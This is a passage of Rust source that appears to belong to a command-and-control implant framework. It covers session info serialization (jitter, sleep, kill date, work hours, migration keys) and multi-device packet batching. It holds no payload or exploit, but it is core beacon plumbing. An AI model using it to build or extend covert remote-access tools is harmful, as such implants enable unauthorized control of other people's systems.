    fn write_info(&self, c: InfoClass, w: &mut impl Writer) -> io::Result<()> {
        match c {
            // TODO(dij): Write Proxy Data here.
            InfoClass::Proxy => return w.write_u8(0),
            InfoClass::Hello | InfoClass::Refresh | InfoClass::SyncAndMigrate => self.device.write_stream(w)?,
            InfoClass::Migrate => self.device.id.write(w)?,
            _ => (),
        }
        w.write_u8(self.jitter)?;
        w.write_u64(self.sleep.as_nanos() as u64)?;
        match self.kill {
            Some(k) => w.write_i64(k.unix()),
            None => w.write_u64(0),
        }?;
        match self.work {
            Some(h) => h.write_stream(w),
            None => {
                w.write_u32(0)?;
                w.write_u8(0)
            },
        }?;
        match c {
            InfoClass::Sync | InfoClass::Proxy | InfoClass::SyncAndMigrate => return Ok(()),
            _ => (),
        }
        // TODO(dij): Write Proxy Data here.
        w.write_u8(0)?;
        if matches!(c, InfoClass::Migrate) {
            self.keys.write_all(w)?;
        }
        Ok(())
    }
    fn read_info(&mut self, c: InfoClass, r: &mut impl Reader) -> io::Result<()> {
        match c {
            // Reject invalid IntoClass entries
            InfoClass::Invalid => return Err(ErrorKind::InvalidData.into()),
            // TODO(dij): Read Proxy Data here.
            InfoClass::Proxy => {
                let _ = r.read_u8()?;
                return Ok(());
            },
            InfoClass::Hello | InfoClass::Refresh | InfoClass::SyncAndMigrate => self.device.read_stream(r)?,
            InfoClass::Migrate => self.device.id.read(r)?,
            _ => (),
        }
        r.read_into_u8(&mut self.jitter)?;
        self.sleep = r
            .read_u64()
            .map(|v| if v == 0 { DEFAULT_SLEEP } else { Duration::from_nanos(v) })?;
        self.kill = r
            .read_i64()
            .map(|v| if v == 0 { None } else { Some(Time::from_nano(v)) })?;
        let w = WorkHours::from_stream(r)?;
        if !w.is_empty() || w.is_valid() {
            self.work = Some(w);
        }
        match c {
            InfoClass::Sync | InfoClass::Proxy | InfoClass::SyncAndMigrate => return Ok(()),
            _ => (),
        }
        // TODO(dij): Read Proxy Data here.
        let _ = r.read_u8()?;
        if matches!(c, InfoClass::Migrate) {
            self.keys.read_all(r)?;
        }
        Ok(())
    }
    fn next_packet(&self, mut n: Packet, mut k: Option<Packet>, t: &[u32]) -> (Packet, Option<Packet>) {
        // NOTE(dij): Fast path (if we have a strict limit OR we don't have
        //            anything in queue, but we got a packet). So just send that
        //            shit/wrap if needed.
        trace!(
            self.log,
            "[{}] Checking next Packet, holding {n}, optional {k:?}.",
            self.id()
        );
        if limits::PACKETS <= 1 || k.is_none() {
            trace!(
                self.log,
                "[{}] Single Packet found, or hit limit, sending single and setting peek to {k:?}.",
                self.id()
            );
            if self.check_device(&mut n) {
                return (n.with_tags(&t), k);
            }
            let mut o = Packet::new_dev(self.id())
                .with_flags(Flag::MULTI | Flag::MULTI_DEVICE)
                .with_tags(&t);
            ignore_error!(write_unpack(&mut o, &n)); // DOES NOT ERROR
            return (o, k);
            // We return 'k' just in case it's not None.
        }
        let mut o = Packet::new_dev(self.id()).with_flags(Flag::MULTI);
        let mut x = if !is_packet_nop(&n) || (!n.device.is_empty() && !n.device.eq(&self.device.id)) {
            trace!(
                self.log,
                "[{}] Building Multi Packet starting with {n}.",
                self.id()
            );
            self.check_device(&mut n); // Verify and fill ID if empty.
            ignore_error!(write_unpack(&mut o, &n)); // DOES NOT ERROR
            o.flags.set_len(1);
            1
        } else {
            trace!(self.log, "[{}] Building Multi Packet.", self.id());
            0
        };
        let (mut s, mut m) = (o.len(), false);
        let p = loop {
            if x >= limits::PACKETS {
                break None;
            }
            let mut r = match k.take().or_else(|| self.to_send.try_recv().ok()) {
                Some(v) => v,
                None => break None,
            };
            trace!(
                self.log,
                "[{}] Pulled next Packet {r} to be added to Multi packet.",
                self.id()
            );
            if is_packet_nop(&r) && ((s > 0 && !m) || r.device.is_empty() || r.device.eq(&self.device.id)) {
                trace!(
                    self.log,
                    "[{}] Skipping NoP Packet assigned to us.",
                    self.id()
                );
                continue;
            }
            // Rare case a single packet (which was already chunked,
            // is bigger than the frag size, shouldn't happen but *shrug*)
            // s would be zero on the first round, so just send that one and "fuck it"
            // assign it to peek.
            if s > 0 {
                s += r.size();
                if s > limits::FRAG {
                    break Some(r);
                }
            } else {
                s += n.size();
            }
            // Set multi device flag if there's a packet in queue that doesn't match us.
            if !self.check_device(&mut r) && !m {
                trace!(
                    self.log,
                    "[{}] Found Packet not assigned to us {r}, adding Multi Device Flag.",
                    self.id()
                );
                o.flags |= Flag::MULTI_DEVICE;
                m = true
            }
            ignore_error!(write_unpack(&mut o, &r));
            x += 1;
        };
        trace!(
            self.log,
            "[{}] Pulling complete, combined {x} Packets into {o}.",
            self.id()
        );
        trace!(self.log, "[{}] Packet Data {:?}", self.id(), o.as_slice());
        // If we get a single packet, unpack it and send it instead.
        // I don't think there's a super good way to do this, as we clear most of the
        // data during write. IE: we have >1 NOPs and just a single data Packet.
        if o.flags.len() == 1 && o.flags & Flag::MULTI_DEVICE == 0 && o.id == 0 {
            trace!(
                self.log,
                "[{}] Combined Packet {o} can be flattened, pulling out contained Packet.",
                self.id()
            );
            let t = Packet::from_stream(&mut o).unwrap_or_default();
            trace!(
                self.log,
                "[{}] Packet checking completed, returning {t} and setting {p:?} as peek.",
                self.id()
            );
            (t, p)
        } else {
            trace!(
                self.log,
                "[{}] Packet checking completed, returning {o} and setting {p:?} as peek.",
                self.id()
            );
            (o, p)
        }
    }
}
impl<'b, 'a, A: Allocator + Clone + 'a + 'b> SessionPair<'b, A> {
    #[inline]
    pub fn start(mut self, dur: Option<Duration>, custom_tasks: Option<&'static Tasker>) -> CoreResult<()> {
        self.session.connect(dur)?;
        let t = Builder::new()
            .spawn(move || self.mux.thread_loop(custom_tasks))
            .map_err(CoreError::from)?;
        trace!(
            self.session.log,
            "[{}] Started Mux Thread!",
            self.session.id()
        );
        self.session.thread();
        // Drop the Session to signal to the thread that it's dead.
        drop(self.session);
        // Wait for the thread to close.
        ignore_error!(t.join());
        Ok(())
    }
}

impl<'a, A: Allocator> TryFrom<CoreResult<SessionPair<'a, A>>> for SessionPair<'a, A> {
    type Error = CoreError;

    #[inline]
    fn try_from(v: CoreResult<SessionPair<'a, A>>) -> CoreResult<SessionPair<'a, A>> {
        v.map_err(CoreError::from)
    }
}
